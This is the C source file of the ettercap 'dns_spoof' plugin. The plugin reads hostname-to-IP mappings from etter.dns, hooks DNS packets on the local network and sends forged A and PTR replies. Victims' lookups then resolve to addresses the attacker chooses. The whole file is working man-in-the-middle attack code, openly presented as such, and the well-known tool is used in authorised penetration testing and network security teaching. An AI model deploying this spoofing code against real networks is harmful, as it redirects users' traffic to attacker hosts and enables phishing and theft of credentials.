/*
    dns_spoof -- ettercap plugin -- spoofs dns reply 

    Copyright (C) ALoR & NaGA
    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

    $Id: dns_spoof.c,v 1.1 2003/11/22 13:57:10 alor Exp $
*/


#include <ec.h>                        /* required for global variables */
#include <ec_plugins.h>                /* required for plugin ops */
#include <ec_file.h>
#include <ec_hook.h>
#include <ec_resolv.h>
#include <ec_strings.h>
#include <ec_send.h>

#include <stdlib.h>
#include <string.h>

/* globals */

struct dns_header {
   u_int16 id;                /* DNS packet ID */
#ifdef WORDS_BIGENDIAN
   u_char  qr: 1;             /* response flag */
   u_char  opcode: 4;         /* purpose of message */
   u_char  aa: 1;             /* authoritative answer */
   u_char  tc: 1;             /* truncated message */
   u_char  rd: 1;             /* recursion desired */
   u_char  ra: 1;             /* recursion available */
   u_char  unused: 1;         /* unused bits */
   u_char  ad: 1;             /* authentic data from named */
   u_char  cd: 1;             /* checking disabled by resolver */
   u_char  rcode: 4;          /* response code */
#else /* WORDS_LITTLEENDIAN */
   u_char  rd: 1;             /* recursion desired */
   u_char  tc: 1;             /* truncated message */
   u_char  aa: 1;             /* authoritative answer */
   u_char  opcode: 4;         /* purpose of message */
   u_char  qr: 1;             /* response flag */
   u_char  rcode: 4;          /* response code */
   u_char  cd: 1;             /* checking disabled by resolver */
   u_char  ad: 1;             /* authentic data from named */
   u_char  unused: 1;         /* unused bits */
   u_char  ra: 1;             /* recursion available */
#endif
   u_int16 num_q;             /* Number of questions */
   u_int16 num_answer;        /* Number of answer resource records */
   u_int16 num_auth;          /* Number of authority resource records */
   u_int16 num_res;           /* Number of additional resource records */
};

struct dns_spoof_entry {
   char *name;
   struct ip_addr ip;
   SLIST_ENTRY(dns_spoof_entry) next;
};

static SLIST_HEAD(, dns_spoof_entry) dns_spoof_head;

/* protos */

int plugin_load(void *);
static int dns_spoof_init(void *);
static int dns_spoof_fini(void *);
static int load_db(void);
static void dns_spoof(struct packet_object *po);
static int get_spoofed_a(char *a, struct ip_addr **ip);
static int get_spoofed_ptr(char *arpa, char **a);

/* plugin operations */

struct plugin_ops dns_spoof_ops = { 
   /* ettercap version MUST be the global EC_VERSION */
   ettercap_version: EC_VERSION,                        
   /* the name of the plugin */
   name:             "dns_spoof",  
    /* a short description of the plugin (max 50 chars) */                    
   info:             "Sends spoofed dns replies",  
   /* the plugin version. */ 
   version:          "1.0",   
   /* activation function */
   init:             &dns_spoof_init,
   /* deactivation function */                     
   fini:             &dns_spoof_fini,
};

/**********************************************************/

/* this function is called on plugin load */
int plugin_load(void *handle) 
{
   /* load the database of soofed replies (etter.dns) 
    * return an error if we could not open the file
    */
   if (load_db() != ESUCCESS)
      return -EINVALID;
   
   return plugin_register(handle, &dns_spoof_ops);
}

/*********************************************************/

static int dns_spoof_init(void *dummy) 
{
   /* 
    * add the hook in the dissector.
    * this will pass only valid dns packets
    */
   hook_add(HOOK_PROTO_DNS, &dns_spoof);
   
   return PLUGIN_RUNNING;
}


static int dns_spoof_fini(void *dummy) 
{
   /* remove the hook */
   hook_del(HOOK_PROTO_DNS, &dns_spoof);

   return PLUGIN_FINISHED;
}


/*
 * load the database in the list 
 */
static int load_db(void)
{
   struct dns_spoof_entry *d;
   struct in_addr ipaddr;
   FILE *f;
   char line[128];
   char *ptr, *ip, *name;
   int lines = 0;
   
   /* open the file */
   f = open_data("share", ETTER_DNS, FOPEN_READ_TEXT);
   if (f == NULL) {
      USER_MSG("Cannot open %s", ETTER_DNS);
      return -EINVALID;
   }
         
   /* load it in the list */
   while (fgets(line, 128, f)) {
      /* count the lines */
      lines++;

      /* trim comments */
      if ( (ptr = strchr(line, '#')) )
         *ptr = 0;

      /* skip empty lines */
      if (!strlen(line))
         continue;
      
      /* get the ip and the name */
      if ((ip = strtok(line, "\t")) == NULL || (name = strtok(NULL, "\n")) == NULL)
         continue;
     
      /* convert the ip address */
      if (inet_aton(ip, &ipaddr) == 0) {
         USER_MSG("%s:%d Invalid ip address\n", ETTER_DNS, lines);
         continue;
      }
        
      /* create the entry */
      SAFE_CALLOC(d, 1, sizeof(struct dns_spoof_entry));

      /* fill the struct */
      ip_addr_init(&d->ip, AF_INET, (char *)&ipaddr);
      d->name = strdup(name);

      /* insert in the list */
      SLIST_INSERT_HEAD(&dns_spoof_head, d, next);
                  
   }
   
   fclose(f);

   return ESUCCESS;
}

/* 
 * parse the packet and send the fake reply
 */
static void dns_spoof(struct packet_object *po)
{
   struct dns_header *dns;
   u_char *data, *end;
   char name[NS_MAXDNAME];
   int name_len;
   u_char *q;
   int16 class, type;

   dns = (struct dns_header *)po->DATA.data;
   data = (u_char *)(dns + 1);
   end = (u_char *)dns + po->DATA.len;
   
   /* extract the name from the packet */
   name_len = dn_expand((u_char *)dns, end, data, name, sizeof(name));
   
   q = data + name_len;
  
   /* get the type and class */
   NS_GET16(type, q);
   NS_GET16(class, q);
      
   /* handle only internet class */
   if (class != ns_c_in)
      return;

   /* we are interested only in DNS query */
   if ( dns->opcode == ns_o_query && htons(dns->num_q) == 1 && htons(dns->num_answer) == 0) {

      /* it is and address resolution (name to ip) */
      if (type == ns_t_a) {
         
         struct ip_addr *reply;
         u_int8 answer[(q - data) + 16];
         char *p = answer + (q - data);
         char tmp[MAX_ASCII_ADDR_LEN];
         
         /* found the reply in the list */
         if (get_spoofed_a(name, &reply) != ESUCCESS)
            return;

         /* 
          * fill the buffer with the content of the request
          * we will append the answer just after the request 
          */
         memcpy(answer, data, q - data);
         
         /* prepare the answer */
         memcpy(p, "\xc0\x0c", 2);                        /* compressed name offset */
         memcpy(p + 2, "\x00\x01", 2);                    /* type A */
         memcpy(p + 4, "\x00\x01", 2);                    /* class */
         memcpy(p + 6, "\x00\x00\x0e\x10", 4);            /* TTL */
         memcpy(p + 10, "\x00\x04", 2);                   /* datalen */
         memcpy(p + 12, &reply->addr, reply->addr_size);  /* data */

         /* send the fake reply */
         send_dns_reply(&po->L3.dst, &po->L3.src, po->L2.src, ntohs(dns->id), answer, sizeof(answer));
         
         USER_MSG("dns_spoof: [%s] spoofed to [%s]\n", name, ip_addr_ntoa(reply, tmp));
         
      /* it is a reverse query (ip to name) */
      } else if (type == ns_t_ptr) {
         
         u_int8 answer[(q - data) + 256];
         char *a, *p = answer + (q - data);
         int rlen;
         
         /* found the reply in the list */
         if (get_spoofed_ptr(name, &a) != ESUCCESS)
            return;

         /* 
          * fill the buffer with the content of the request
          * we will append the answer just after the request 
          */
         memcpy(answer, data, q - data);
         
         /* prepare the answer */
         memcpy(p, "\xc0\x0c", 2);                        /* compressed name offset */
         memcpy(p + 2, "\x00\x0c", 2);                    /* type PTR */
         memcpy(p + 4, "\x00\x01", 2);                    /* class */
         memcpy(p + 6, "\x00\x00\x0e\x10", 4);            /* TTL */
         /* compress the string into the buffer */
         rlen = dn_comp(a, p + 12, 256, NULL, NULL);
         /* put the length before the dn_comp'd string */
         p += 10;
         NS_PUT16(rlen, p);

         /* send the fake reply */
         send_dns_reply(&po->L3.dst, &po->L3.src, po->L2.src, ntohs(dns->id), answer, (q - data) + 12 + rlen);
         
         USER_MSG("dns_spoof: [%s] spoofed to [%s]\n", name, a);
         
      }
   }
}


/*
 * return the ip address for the name
 */
static int get_spoofed_a(char *a, struct ip_addr **ip)
{
   struct dns_spoof_entry *d;

   SLIST_FOREACH(d, &dns_spoof_head, next) {
      if (match_pattern(a, d->name)) {

         /* return the pointer to the struct */
         *ip = &d->ip;
         
         return ESUCCESS;
      }
   }
   
   return -ENOTFOUND;
}

/* 
 * return the name for the ip address 
 */
static int get_spoofed_ptr(char *arpa, char **a)
{
   struct dns_spoof_entry *d;
   struct ip_addr ptr;
   int a0, a1, a2, a3;
   char ip[4];

   /* parses the arpa format */
   if (sscanf(arpa, "%d.%d.%d.%d.in-addr.arpa", &a3, &a2, &a1, &a0) != 4)
      return -EINVALID;

   /* reverse the order */
   ip[0] = a0 & 0xff; 
   ip[1] = a1 & 0xff; 
   ip[2] = a2 & 0xff; 
   ip[3] = a3 & 0xff;

   /* init the ip_addr structure */
   ip_addr_init(&ptr, AF_INET, ip);

   /* search in the list */
   SLIST_FOREACH(d, &dns_spoof_head, next) {
      /* 
       * we cannot return whildcards in the reply, 
       * so skip the entry if the name contains a '*'
       */
      if (!ip_addr_cmp(&ptr, &d->ip) && strchr(d->name, '*') == NULL) {

         /* return the pointer to the struct */
         *a = d->name;
         
         return ESUCCESS;
      }
   }
   
   return -ENOTFOUND;
}
   
/* EOF */

// vim:ts=3:expandtab
